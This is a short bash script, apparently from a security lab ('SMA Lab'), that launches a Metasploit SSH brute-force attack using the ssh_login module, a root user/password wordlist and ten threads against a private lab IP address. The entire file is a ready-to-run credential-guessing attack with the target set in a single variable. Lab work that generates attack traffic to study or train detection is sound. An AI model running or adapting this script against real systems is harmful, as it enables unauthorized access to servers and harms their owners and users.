#!/bin/bash
# SMA Lab - Attacker Launch Script (Metasploit)
# Run this on Arch Linux to start a high-volume attack

# CONFIGURATION
TARGET_IP="192.168.56.101"
WORDLIST="/usr/share/metasploit-framework/data/wordlists/root_userpass.txt"

# Verification
if [ ! -f "$WORDLIST" ]; then
    echo "[!] Error: Wordlist $WORDLIST not found."
    exit 1
fi

echo "[*] Launching Metasploit SSH Brute-Force against $TARGET_IP..."

# Execute Attack
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; \
set RHOSTS $TARGET_IP; \
set USERPASS_FILE $WORDLIST; \
set THREADS 10; \
run; \
exit"
